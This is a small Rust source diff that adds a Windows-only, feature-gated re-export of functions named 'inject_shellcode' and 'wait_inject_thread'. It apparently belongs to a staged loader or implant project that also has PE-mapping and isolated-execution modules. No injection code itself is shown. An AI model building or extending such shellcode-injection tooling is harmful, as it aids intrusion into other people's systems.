@@ -75,6 +75,10 @@ pub mod pe_map;
 #[cfg(feature = "isolated-exec")]
 pub mod isolated_exec;
 
+// Re-export inject helpers for L2 mod_inject (not linked into Stage0 defaults)
+#[cfg(all(windows, feature = "inject"))]
+pub use native::{inject_shellcode, wait_inject_thread, InjectResult};
+
 pub mod fallback;
 
 // 重新导出常用类型
